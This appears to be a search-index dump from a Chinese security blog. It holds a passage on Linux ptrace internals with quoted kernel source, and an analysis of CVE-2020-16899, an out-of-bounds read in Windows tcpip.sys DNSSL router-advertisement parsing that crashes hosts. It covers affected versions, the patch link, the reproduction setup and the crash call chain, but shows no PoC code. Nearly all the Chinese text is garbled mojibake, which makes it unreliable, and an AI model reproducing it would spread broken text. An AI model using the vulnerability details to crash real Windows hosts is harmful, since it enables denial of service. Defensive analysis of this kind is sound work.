write_unlock_irq(\u0026tasklist_lock); return ret; } åˆ†æ é€šè¿‡åˆ†ææºç æˆ‘ä»¬å¯ä»¥æ˜ç¡®çœ‹åˆ°ï¼ŒPTRACE_TRACEMEå¹¶æ²¡æœ‰çœŸæ­£ä½¿å­è¿›ç¨‹åœæ­¢ã€‚å®ƒå†…éƒ¨å®Œæˆçš„æ“ä½œåªæœ‰å¯¹çˆ¶è¿›ç¨‹æ˜¯å¦èƒ½å¯¹å­è¿›ç¨‹è¿›è¡Œtraceçš„åˆæ³•æ€§æ£€æŸ¥ï¼Œç„¶åå°†å­è¿›ç¨‹é“¾æ¥åˆ°çˆ¶è¿›ç¨‹çš„é¥¿ptraceé“¾è¡¨ä¸­ã€‚çœŸæ­£å¯¼è‡´å­è¿›ç¨‹åœæ­¢çš„æ˜¯execç³»ç»Ÿè°ƒç”¨ã€‚ åœ¨ç³»ç»Ÿè°ƒç”¨æˆåŠŸåï¼Œkernelä¼šåˆ¤æ–­è¯¥è¿›ç¨‹æ˜¯å¦è¢«ptraceè·Ÿè¸ªã€‚å¦‚æœå¤„äºè·Ÿè¸ªçŠ¶æ€ï¼Œkernelå°†ä¼šå‘è¯¥è¿›ç¨‹å‘é€SIGTRAPä¿¡å·ï¼Œæ­£æ˜¯è¯¥ä¿¡å·å¯¼è‡´äº†å½“å‰è¿›ç¨‹çš„åœæ­¢ã€‚ /** * ptrace_event - possibly stop for a ptrace event notification * @event: %PTRACE_EVENT_* value to report * @message: value for %PTRACE_GETEVENTMSG to return * * Check whether @event is enabled and, if so, report @event and @message * to the ptrace parent. * * Called without locks. */ static inline void ptrace_event(int event, unsigned long message) { if (unlikely(ptrace_event_enabled(current, event))) { current-\u003eptrace_message = message; ptrace_notify((event \u003c\u003c 8) | SIGTRAP); } else if (event == PTRACE_EVENT_EXEC) { /* legacy EXEC report via SIGTRAP */ if ((current-\u003eptrace \u0026 (PT_PTRACED|PT_SEIZED)) == PT_PTRACED) send_sig(SIGTRAP, current, 0); } } åœ¨exec.cä¸­å¯¹è¯¥å‡½æ•°çš„è°ƒç”¨å¦‚ä¸‹ï¼š static int exec_binprm(struct linux_binprm *bprm) { pid_t old_pid, old_vpid; int ret, depth; /* Need to fetch pid before load_binary changes it */ old_pid = current-\u003epid; rcu_read_lock(); old_vpid = task_pid_nr_ns(current, task_active_pid_ns(current-\u003eparent)); rcu_read_unlock(); ....... audit_bprm(bprm); trace_sched_process_exec(current, old_pid, bprm); // è°ƒç”¨ptrace_event,ä¼ å…¥çš„eventä¸ºPTRACE_EVENT_EXEC // ç›´æ¥èµ°å‘é€SIGTRAPçš„é€»è¾‘ ptrace_event(PTRACE_EVENT_EXEC, old_vpid); proc_exec_connector(current); return 0; } SIGTRAPä¿¡å·çš„å€¼ä¸º5ï¼Œä¸“é—¨ä¸ºè°ƒè¯•è®¾è®¡ã€‚å½“kernelå‘ç”Ÿint 3æ—¶ï¼Œè§¦å‘å›æ‰å‡½æ•°do_trap()ï¼Œå…¶ä»£ç å¦‚ä¸‹ï¼š asmlinkage void do_trap(struct pt_regs *regs, unsigned long address) { force_sig_fault(SIGTRAP, TRAP_TRACE, (void __user *)address); regs-\u003epc += 4; } int force_sig_fault(int sig, int code, void __user *addr ___ARCH_SI_TRAPNO(int trapno) ___ARCH_SI_IA64(int imm, unsigned int flags, unsigned long isr)) { return force_sig_fault_to_task(sig, code, addr ___ARCH_SI_TRAPNO(trapno) ___ARCH_SI_IA64(imm, flags, isr), current); } çˆ¶è¿›ç¨‹å”¤é†’waitå¯¹å­è¿›ç¨‹è¿›è¡Œç›‘æ§ï¼Œwaitæœ‰3ç§é€€å‡ºæƒ…å†µï¼ˆå­è¿›ç¨‹æ­£å¸¸é€€å‡ºã€æ”¶åˆ°ä¿¡å·é€€å‡ºã€æ”¶åˆ°ä¿¡å·æš‚åœï¼‰ï¼Œå¯¹äºPTRACE_TRACEMEæ¥è¯´ï¼Œå¯¹åº”çš„æ˜¯ç¬¬ä¸‰ç§æƒ…å†µâ€“æ”¶åˆ°ä¿¡å·åæš‚åœã€‚ PTRACE_TRACEMEåªæ˜¯è¡¨æ˜äº†å­è¿›ç¨‹å¯ä»¥è¢«traceï¼Œå¦‚æœè¿›ç¨‹è°ƒç”¨äº†PTRACE_TRACEMEï¼Œé‚£ä¹ˆè¯¥è¿›ç¨‹å¤„ç†ä¿¡å·çš„æ–¹å¼ä¼šå‘ç”Ÿæ”¹å˜ã€‚ä¾‹å¦‚ä¸€ä¸ªè¿›ç¨‹æ­£åœ¨è¿è¡Œï¼Œæ­¤æ—¶è¾“å…¥ctrl+c(SIGINT),åˆ™è¿›ç¨‹ä¼šç›´æ¥é€€å‡ºï¼›å¦‚æœè¿›ç¨‹ä¸­æœ‰ptrace (PTRACE_TRACEME,0ï¼ŒNULL,NULL)ï¼Œå½“è¾“å…¥CTRL+Cæ—¶ï¼Œè¯¥è¿›ç¨‹å°†ä¼šå¤„äºstoppedçš„çŠ¶æ€ã€‚ åœ¨sys_ptraceå‡½æ•°ä¸­ï¼Œè¯¥éƒ¨åˆ†çš„å¤„ç†æµç¨‹å¦‚ä¸‹ï¼š åœ¨5.9ç‰ˆä¸­ï¼Œå•ç‹¬å†™æˆäº†ptrace_traceme()å‡½æ•°ï¼Œè€Œåœ¨2.6ç‰ˆæœ¬ä¸­ï¼Œç›´æ¥åœ¨sys_ptraceçš„é€»è¾‘ä¸­è¿›è¡Œå®ç°ï¼š è™½ç„¶2ä¸ªç‰ˆæœ¬çš„æ ¸å¿ƒåŠŸèƒ½ç›¸åŒï¼Œä½†æ˜¯5.9ç‰ˆæœ¬çš„å¤„ç†é€»è¾‘å’Œæƒ…å†µè€ƒé‡ç›¸æ¯”2.6ç‰ˆæœ¬ä¸Šå‡äº†å¾ˆå¤§é«˜åº¦ã€‚ 2. PTRACE_ATTACH æè¿° attachåˆ°pidæŒ‡å®šçš„è¿›ç¨‹ï¼Œä½¿å…¶æˆä¸ºè°ƒç”¨è¿›ç¨‹çš„traceeã€‚tracerä¼šå‘traceeå‘é€ä¸€ä¸ªSIGSTOPä¿¡å·ï¼Œä½†ä¸ä¸€å®šå·²é€šè¿‡æ­¤è°ƒç”¨å®Œæˆè€Œåœæ­¢ï¼›tracerä½¿ç”¨waitpid()ç­‰å¾…traceeåœæ­¢ã€‚ å®šä¹‰ static int ptrace_attach(struct task_struct *task, long request, unsigned long addr, unsigned long flags) { bool seize = (request == PTRACE_SEIZE); int retval; retval = -EIO; /* I/O error*/ /* * åˆ¤æ–­requestæ˜¯PTRACE_SEIZEè¿˜æ˜¯PTRACE_ATTACHã€‚ * å¦‚æœrequestä¸ºPTRACE_SEIZEï¼Œåˆ™è¿›è¡Œå¿…è¦çš„å‚æ•°æ£€æŸ¥ï¼Œé”™è¯¯æ—¶é€€å‡ºã€‚ */ if (seize) { if (addr != 0) goto out; if (flags \u0026 ~(unsigned long)PTRACE_O_MASK) goto out; flags = PT_PTRACED | PT_SEIZED | (flags \u003c\u003c PT_OPT_FLAG_SHIFT); } else { flags = PT_PTRACED; } audit_ptrace(task); /* * åˆ¤æ–­taskè¿›ç¨‹æ˜¯å¦ä¸ºkernel threadï¼ˆPF_KTHREADï¼‰ï¼Œ * è°ƒç”¨same_thread_group(task, current)ï¼Œåˆ¤æ–­taskæ˜¯å¦å’Œcurrentè¿›ç¨‹åœ¨åŒä¸€ä¸ªçº¿ç¨‹ç»„ï¼ŒæŸ¥çœ‹currentè¿›ç¨‹æ˜¯å¦æœ‰æƒé™trace taskè¿›ç¨‹ã€‚ * å¦‚æœä¸ç¬¦åˆè¦æ±‚ï¼Œåˆ™ç›´æ¥é€€å‡ºã€‚ */ retval = -EPERM; /*","date":"2020-10-27","objectID":"/2020/10/ptrace/:4:2","tags":["ptrace"],"title":"Linux ptrace è¯¦è§£","uri":"/2020/10/ptrace/"},{"categories":["Vuln"],"content":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ [toc] ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:0:0","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"ä¸€ã€æ¼æ´ä¿¡æ¯ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:0","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"1. æ¼æ´ç®€è¿° æ¼æ´åç§°ï¼šWindows TCP/IP Denial of Service Vulnerability æ¼æ´ç¼–å·ï¼šCVE-2020-16899 æ¼æ´ç±»å‹ï¼šRead out of Bound æ¼æ´å½±å“ï¼šDenial of Service CVSSè¯„åˆ†ï¼š7.5 åˆ©ç”¨éš¾åº¦ï¼šMedium åŸºç¡€æƒé™ï¼šä¸éœ€è¦ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:1","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"2. ç»„ä»¶æ¦‚è¿° TCP/IPæ˜¯Internetä¸Šä½¿ç”¨çš„é€šä¿¡åè®®ã€‚ åœ¨Windowsçš„æ—©æœŸç‰ˆæœ¬ä¸­ï¼ŒTCP/IPæ˜¯ä¸€ä¸ªå•ç‹¬çš„å¯é€‰ç»„ä»¶ï¼Œå¯ä»¥åƒå…¶ä»–ä»»ä½•åè®®ä¸€æ ·åˆ é™¤æˆ–æ·»åŠ ã€‚ä»Windows XP/Server 2003å¼€å§‹ï¼ŒTCP/IPæˆä¸ºæ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œæ— æ³•åˆ é™¤ã€‚ å°†TCP/IPä½œä¸ºWindowsçš„æ ¸å¿ƒç»„ä»¶æ˜¯éå¸¸æœ‰æ„ä¹‰çš„ï¼Œå› ä¸ºå®ƒçš„åŠŸèƒ½åœ¨Microsoft Windows Serverä¸Šå¯¹ç½‘ç»œæ“ä½œå’ŒActive DirectoryåŸŸç¯å¢ƒå°¤ä¸ºé‡è¦ã€‚ æ•´ä¸ªActive Directoryæ¶æ„åŸºäºDNSå±‚æ¬¡ç»“æ„ï¼Œä¾èµ–äºTCP/IP ä¼ è¾“åè®® ã€‚ Microsoft Windowsä¸­çš„TCP/IPåŠŸèƒ½åœ¨å†…æ ¸çº§åˆ«è¿è¡Œï¼Œå¹¶ç”±é©±åŠ¨ç¨‹åºtcpip.sysæä¾›ã€‚è¯¥é©±åŠ¨ç¨‹åºå¤„ç†æ‰€æœ‰ä¼ å…¥å’Œä¼ å‡ºçš„TCP/IPé€šä¿¡ä¿¡æ¯ï¼ŒåŒ…æ‹¬è§£æä»ç½‘ç»œæ¥å£æ¥æ”¶åˆ°çš„æ•°æ®åŒ…ï¼Œå¹¶å°†å…¶ä¼ é€’ç»™æ›´é«˜çº§åˆ«çš„ç»„ä»¶ã€‚ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:2","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"3. æ¼æ´åˆ©ç”¨ è¯¥æ¼æ´ä¸»è¦æ˜¯ç”±äºWindows TCP/IPå †æ ˆåœ¨å¤„ç†é€‰é¡¹ç±»å‹ä¸º31(0x1fï¼ŒDNSæœç´¢è¡¨é€‰é¡¹)çš„ICMPv6çš„è·¯ç”±å¹¿æ’­æ•°æ®åŒ…æ—¶ï¼Œå¤„ç†é€»è¾‘å­˜åœ¨è¶Šç•Œè¯»ï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡æ¼æ´ã€‚æ”»å‡»è€…æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä½¿ç›®æ ‡ä¸»æœºå¤±å»å“åº”ï¼Œä½†æ— æ³•ç›´æ¥è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œæˆ–æƒé™æå–ã€‚ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:3","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"4. æ¼æ´å½±å“ â€¢ Microsoft Windows 10 1709 â€¢ Microsoft Windows 10 1803 â€¢ Microsoft Windows 10 1809 â€¢ Microsoft Windows 10 1903 â€¢ Microsoft Windows 10 1909 â€¢ Microsoft Windows 10 2004 â€¢ Microsoft Windows Server 2019 â€¢ Microsoft Windows Server, version 1903 â€¢ Microsoft Windows Server, version 1909 â€¢ Microsoft Windows Server, version 2004 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:4","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"5. è§£å†³æ–¹æ¡ˆ å¾®è½¯å®˜æ–¹é’ˆå¯¹è¯¥æ¼æ´å·²å‘å¸ƒå®‰å…¨æ›´æ–°è¡¥ä¸ï¼Œè¡¥ä¸åœ°å€ï¼š https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16899 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:1:5","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"äºŒã€æ¼æ´å¤ç° ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:2:0","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"1. ç¯å¢ƒæ­å»º é¶æœºï¼šWindows 10 1809 x64 é¶æœºæ“ä½œï¼šä½¿ç”¨verifierå¼€å¯tcpip.sysçš„éªŒè¯ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:2:1","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"2. å¤ç°è¿‡ç¨‹ é€šè¿‡å„ç§æ‰‹æ®µè·å–ç›®æ ‡ä¸»æœºçš„IPv6åœ°å€å’ŒMACåœ°å€ï¼ˆå…·ä½“æ–¹æ³•å¯è‡ªè¡Œæ¢ç´¢ï¼Œè¾ƒä¸ºç®€å•ï¼‰ æ”»å‡»æœºpython3è¿è¡Œpocï¼š é¶æœºcrashï¼š ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:2:2","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"ä¸‰ã€æ¼æ´åˆ†æ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:0","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"1. åŸºæœ¬ä¿¡æ¯ æ¼æ´æ–‡ä»¶ï¼štcpip.sys æ¼æ´å‡½æ•°ï¼š Ipv6pUpdateDNSSL()å‡½æ•° æ¼æ´å¯¹è±¡ï¼šICMPv6è·¯ç”±å¹¿æ’­ä¸­çš„optionç»“æ„(DNS Option structure) ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:1","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"2. èƒŒæ™¯çŸ¥è¯† (é™äºç¯‡å¹…é—®é¢˜ï¼Œæ­¤å¤„ä¸å¯¹ç”¨äºDNSé…ç½®çš„IPv6è·¯ç”±å¹¿æ’­è¿›è¡Œè¯¦ç»†ä»‹ç»ï¼Œæ›´è¯¦ç»†èµ„æ–™å¯å‚è€ƒRFC8106) 1. åŸºæœ¬çŸ¥è¯† IPv6 Router Advertisment (RA) optionsï¼Œä¹Ÿç§°ä¸ºDNS RA optionsï¼Œå…è®¸IPv6çš„è·¯ç”±å™¨å‘IPv6çš„ä¸»æœºå¹¿æ’­DNS Recursive Server Address(DNSé€’å½’è·¯ç”±å™¨åœ°å€)åˆ—è¡¨å’ŒDNS Search Listï¼ˆDNSæœç´¢åˆ—è¡¨ï¼‰ï¼Œå…¶ä¸»è¦ç”¨é€”ä¸ºåœ¨IPv6çš„ä¸»æœºä¸Šè¿›è¡ŒDNSåç§°è§£æä»¥åŠåŸŸåç¼€çš„å¤„ç†ã€‚ IPv6 Neighbor Discovery(NDï¼ŒIPv6é‚»å±…å‘ç°)å’ŒIPv6 Stateless Address Autoconfiguratioin(SLAACï¼ŒIPv6æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®)æä¾›äº†ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ªIPv6åœ°å€ï¼Œé»˜è®¤è·¯ç”±å™¨ä»¥åŠä¸€äº›å…¶ä»–å‚æ•°é…ç½®å›ºå®šèŠ‚ç‚¹æˆ–ç§»åŠ¨èŠ‚ç‚¹çš„æ–¹æ³•ã€‚ å½“æ¼«æ¸¸ä¸»æœºæ¯æ¬¡è¿æ¥åˆ°å¦ä¸€ä¸ªç½‘ç»œæ—¶ï¼Œæ— æ³•è¿›è¡Œæ‰‹åŠ¨é…ç½®ã€‚ è™½ç„¶å¯ä»¥è¿›è¡Œé™æ€é…ç½®ï¼Œä½†æ˜¯åœ¨è¯¸å¦‚ç¬”è®°æœ¬ç”µè„‘ä¹‹ç±»çš„é€šç”¨ä¸»æœºä¸Šé€šå¸¸ä¸å»ºè®®è¿™æ ·æ“ä½œã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä¸»æœºè¿è¡Œç›´æ¥è¿æ¥åˆ°å…¨å±€DNSçš„è‡ªå·±çš„é€’å½’åç§°æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæœ¬åœ°å®šä¹‰çš„åç§°ç©ºé—´å¯¹ä¸»æœºæ¥è¯´å°±ä¸å¯ç”¨äº†ã€‚è®¿é—®DNSæ˜¯å‡ ä¹æ‰€æœ‰ä¸»æœºçš„åŸºæœ¬è¦æ±‚ï¼Œå› æ­¤IPv6 SLAACåœ¨æ²¡æœ‰ä»»ä½•DNSé…ç½®æ”¯æŒçš„æƒ…å†µä¸‹ï¼Œä¸èƒ½åœ¨ä»»ä½•å®é™…çš„ç½‘ç»œç¯å¢ƒä¸­å•ç‹¬ä½œä¸ºæ›¿ä»£éƒ¨ç½²æ¨¡å‹ã€‚ å¯¹äºIPv4ç¯å¢ƒä¸­çš„DNSæœåŠ¡å™¨æ¥è¯´ï¼Œè¿™äº›é—®é¢˜éƒ½å¾ˆå®¹æ˜“è§£å†³ã€‚ä½†æ˜¯å¯¹äºIPv6çš„ç½‘ç»œç¯å¢ƒï¼Œè¿™äº›é—®é¢˜æ˜¾å¾—æ¯”è¾ƒæ£˜æ‰‹ã€‚å› æ­¤ï¼ŒRFC8106å®šä¹‰äº†ä¸€ç§åŸºäºDNS RAé€‰é¡¹çš„æœºåˆ¶ï¼Œä»¥å…è®¸IPv6ä¸»æœºæ‰§è¡Œè‡ªåŠ¨DNSé…ç½®ã€‚ åœ¨é€šè¿‡IPv6 SLAACè‡ªåŠ¨é…ç½®IPv6ä¸»æœºåœ°å€å¹¶ä¸”æ²¡æœ‰DHCPv6åŸºç¡€ç»“æ„æˆ–ä¸€äº›ä¸»æœºæ²¡æœ‰DHCPv6å®¢æˆ·ç«¯çš„ç½‘ç»œç¯å¢ƒä¸­ï¼Œå¯ä»¥ä½¿ç”¨åŸºäºRAçš„DNSé…ç½®ä½œä¸ºæ›¿ä»£ã€‚ ä½†æ˜¯ï¼Œå¯¹äºéœ€è¦åˆ†å‘å…¶ä»–ä¿¡æ¯çš„ç½‘ç»œï¼Œå¯èƒ½ä»ç„¶ä¼šä½¿ç”¨DHCPv6ã€‚ åœ¨è¿™äº›ç½‘ç»œä¸­ï¼Œå¯èƒ½ä¸éœ€è¦åŸºäºRAçš„DNSé…ç½®ã€‚ åŸºäºRAçš„DNSé…ç½®å…è®¸IPv6ä¸»æœºè·å–ä¸»æœºè¿æ¥åˆ°çš„é“¾æ¥çš„DNSé…ç½®ï¼ˆå³DNSé€’å½’æœåŠ¡å™¨åœ°å€å’ŒDNSSLï¼‰ã€‚ æ­¤å¤–ï¼Œä¸»æœºä¼šä»æä¾›é“¾æ¥é…ç½®ä¿¡æ¯çš„åŒä¸€RAæ¶ˆæ¯ä¸­å­¦ä¹ æ­¤DNSé…ç½®ã€‚ 2. åè¯è§£é‡Š Recursive DNS Server (RDNSS)ï¼šé€’å½’DNSæœåŠ¡å™¨ï¼Œæä¾›é€’å½’DNSè§£ææœåŠ¡çš„æœåŠ¡å™¨ï¼Œç”¨äºå°†åŸŸåè½¬æ¢ä¸ºIPåœ°å€æˆ–è§£ææˆRFC1034å’ŒRFC1035ä¸­å®šä¹‰çš„PTRè®°å½•ã€‚ RDNSS Optionï¼šä¸€ä¸ªç”¨äºå‘IPv6ä¸»æœºä¼ é€RDNSSä¿¡æ¯çš„IPv6çš„RA optionã€RFC4861ã€‘ã€‚ DNS Search List (DNSSL)ï¼šIPv6ä¸»æœºåœ¨æ‰§è¡ŒDNSæŸ¥è¯¢æœç´¢æ—¶ä½¿ç”¨çš„DNSåç¼€åŸŸååˆ—è¡¨ï¼Œç”¨äºæœç´¢ç®€çŸ­çš„ä¸åˆæ ¼åŸŸåã€‚ DNSSL Optionï¼šä¸€ä¸ªIPv6 RAé€‰é¡¹ï¼Œç”¨äºå°†DNSSLä¿¡æ¯ä¼ é€’åˆ°IPv6ä¸»æœºã€‚ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:2","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"3. è¯¦ç»†åˆ†æ 1. åŸºç¡€åˆ†æ RFC8106æ ‡å‡†åŒ–äº†DNSSL Optionï¼Œè¯¥ç»“æ„ä¸­åŒ…å«DNSæœç´¢åˆ—è¡¨(DNSSL)ï¼Œä¿è¯ä¸DHCPv6 optionä¿æŒç›¸åŒçš„å¥‡å¶æ ¡éªŒï¼Œå¹¶ç¡®ä¿å…·å¤‡ç¡®å®šæœç´¢åŸŸçš„å¿…è¦åŠŸèƒ½ã€‚ 1. é‚»å±…å‘ç°æ‰©å±• RFC8106ä¸­å®šä¹‰çš„åœ¨é‚»å±…å‘ç°ä¸­ä½¿ç”¨çš„IPv6 DNSé…ç½®ç®—æ³•éœ€è¦ç”¨åˆ°2ç§ND optionsï¼šRDNSS optionå’ŒDNSSL optionã€‚ä¸è¯¥æ¼æ´ç›¸å…³çš„æ˜¯DNSSL Optionï¼Œå¦å¤–ä¸€ç§åˆ™ä¸ CVE-2020-16899ç›¸å…³ã€‚ 2. DNSSL Option Structure DNSSL OptionåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªDNSåç¼€ï¼Œæ‰€æœ‰çš„domain nameä½¿ç”¨ç›¸åŒçš„Lifetimeã€‚å¦‚æœéœ€è¦ä¸åŒçš„Lifetimeå€¼ï¼Œåˆ™éœ€è¦å¤šä¸ªDNSSL Optionç»“æ„ã€‚ DNSSL Optionæ€»ä½“ç»“æ„å¦‚ä¸‹ï¼š Offset Size(bytes) Field Descriptioin 0x00 1 Type 8-bitï¼ŒDNSSL Option type identifierï¼Œ0x1f(31) 0x01 1 Length optioné•¿åº¦ï¼ˆåŒ…æ‹¬\"Type\"å’Œ\"Length\"å­—æ®µï¼‰ï¼Œä»¥8ä¸ªå…«ä½ä½ç»„ä¸ºå•ä½ã€‚æœ€å°å€¼ä¸º2ï¼Œæ­¤æ—¶optionä¸­ä»…æœ‰1ä¸ªdomain nameã€‚ 0x02 2 Reserved ä¿ç•™å­—æ®µ 0x04 4 Lifetime DNSSLä¸­çš„domain nameå¯ç”¨äºåç§°è§£æçš„æœ€é•¿æ—¶é—´ï¼ˆä»¥ç§’ä¸ºå•ä½ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥å€¼è‡³å°‘ä¸º3 * MaxRtrAdvIntervalï¼Œå…¶ä¸­MaxRtrAdvIntervalæ˜¯RFC4861ä¸­å®šä¹‰çš„æœ€å¤§RAé—´éš”ã€‚ 0xffffffffè¡¨ç¤ºæ— ç©·å¤§ï¼Œ é›¶å€¼æ„å‘³ç€å¿…é¡»ä¸å†ä½¿ç”¨domain namesã€‚ 0x08 8 Domain Names of DNS Search List ä¸€ä¸ªæˆ–å¤šä¸ªdomain nameã€‚ å¯¹äºLengthå­—æ®µï¼Œå¦‚æœoptionä¸­ä»…æœ‰ä¸€ä¸ªdomain nameï¼Œåˆ™ä¸ºæœ€å°å€¼ä¸º2ã€‚ Domain Names of DNS Search Listå­—æ®µä¸­çš„domain nameçš„ç¼–ç è¦éµå¾ªRFC1035çš„3.1èŠ‚ä¸­å®šä¹‰çš„æ ¼å¼ï¼š å¤šä¸ªdomian nameç›´æ¥ç›¸è¿ã€‚ 3. Procedure in IPv6 Hosts å½“ä¸»æœºæ¥æ”¶åˆ°RAæ¶ˆæ¯ä¸­çš„DNSçš„optionsæ—¶ï¼Œå…¶å¤„ç†è¿‡ç¨‹å¦‚ä¸‹ï¼š é¦–å…ˆæ£€æŸ¥Lenghå­—æ®µçš„åˆæ³•æ€§ï¼šæ˜¯å¦å¤§äºç­‰äºæœ€å°å€¼2ï¼› å¦‚æœä»¥ä¸ŠéªŒè¯é€šè¿‡ï¼Œåˆ™ä¸»æœºåº”æŒ‰é¡ºåºå°†é€‰é¡¹çš„å€¼å¤åˆ¶åˆ°DNSå­˜å‚¨åº“å’Œè§£æå™¨å­˜å‚¨åº“ä¸­ã€‚ å¦åˆ™ï¼Œä¸»æœºå¿…é¡»ä¸¢å¼ƒè¿™äº›é€‰é¡¹ã€‚ 4. Crashåˆ†æ é¦–å…ˆåˆ†ædmpæ–‡ä»¶ï¼ŒæŸ¥çœ‹crashç°åœºï¼š CallStackç›´æ¥ç»™å‡ºäº†å‡½æ•°çš„è°ƒç”¨é“¾ï¼š Icmpv6ReceiveDatagrams() -\u003e Ipv6pHandleRouterAdvertisement() -\u003eIpv6pUpdateDNSSL() -\u003e GetNextSuffixFromOption() æœ€ç»ˆæ˜¯åœ¨GetNextSuffixFromOption()å‡½æ•°ä¸­æŠ¥äº†å†…å­˜é¡µé”™è¯¯ï¼Œå¯¼è‡´æœ€ç»ˆçš„crashã€‚ 5. æ¼æ´åŸå›  Windows IPv6å †æ ˆä¸ºDNSSLä¸­çš„æ¯ä¸ªdomain nameåˆ†é…ä¸€ä¸ª256å­—èŠ‚çš„bufferã€‚ RFC 1035å°†åŸŸåé™åˆ¶ä¸º255ä¸ªå­—èŠ‚ï¼Œå› æ­¤domain nameé•¿åº¦åŠ ä¸Šæœ«å°¾çš„ç©ºå­—ç¬¦åˆšå¥½å¯ä»¥æ»¡è¶³bufferçš„å¤§å°è¦æ±‚ã€‚ ä½†æ˜¯ï¼Œæ¼æ´ä»£ç å¤„ç†è¯¥éƒ¨åˆ†æ•°æ®æ—¶ï¼Œå…¶ä¸Šé™ç­‰äºDNSSL Optionä¸­çš„å‰©ä½™å­—èŠ‚ï¼Œå¯ä»¥è¶…è¿‡256ä¸ªå­—èŠ‚ã€‚å› æ­¤ï¼Œæ¼æ´ä»£ç å¯èƒ½ä¼šé”™è¯¯åœ°æ¶ˆè€—æ¯”ä¸ºbufferåˆ†é…çš„å­—èŠ‚æ›´å¤šçš„å­—èŠ‚ï¼Œä»è€Œå¯¼è‡´è¶Šç•Œè¯»ã€‚ å¦‚æœbufferä½äºä¸€ä¸ªmemory pageçš„æœ«å°¾ï¼Œåˆ™è¯¥OOBè¯»å–å°±ä¼šå¯¼è‡´BSODã€‚ 2. æ¼æ´å‡½æ•°åˆ†æ åˆ†æä½¿ç”¨çš„æ–‡ä»¶ä¸ºWindows 10 1809 x64çš„tcpip.sysæ–‡ä»¶ï¼Œç‰ˆæœ¬ä¸º10.0.17763.316ã€‚ ç»è¿‡ç®€å•åˆ†æå¯ä»¥ç¡®è®¤ï¼Œè°ƒç”¨é“¾çš„é¡¶å±‚å‡½æ•°Icmpv6ReceiveDatagrams()æ²¡æœ‰å®è´¨æ€§çš„ä¸æ¼æ´è§¦å‘å¯†åˆ‡ç›¸å…³çš„å¤„ç†é€»è¾‘ï¼Œæ•…è€Œè·³è¿‡ã€‚ 1. 